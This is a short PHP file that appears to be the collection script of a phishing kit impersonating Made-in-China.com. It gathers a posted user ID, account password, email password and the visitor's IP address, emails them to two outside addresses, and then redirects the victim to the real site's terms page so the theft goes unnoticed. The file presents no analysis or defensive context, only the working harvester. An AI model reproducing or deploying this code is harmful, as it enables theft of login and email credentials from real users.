<?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------MIC--------------\n";
$message .= "User ID: ".$_POST['aaa']."\n";
$message .= "Password: ".$_POST['bbb']."\n";
$message .= "emailPassword: ".$_POST['ccc']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------By Weezy-----------------\n";
$send = "jesus.chirst@yandex.com,a.knaub.bargain24@gmail.com";
$subject = "Weezy Made-in-China.com";
$headers = "From: Made-in-China.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.made-in-china.com/help/terms_chinasupplier/");
	  

?>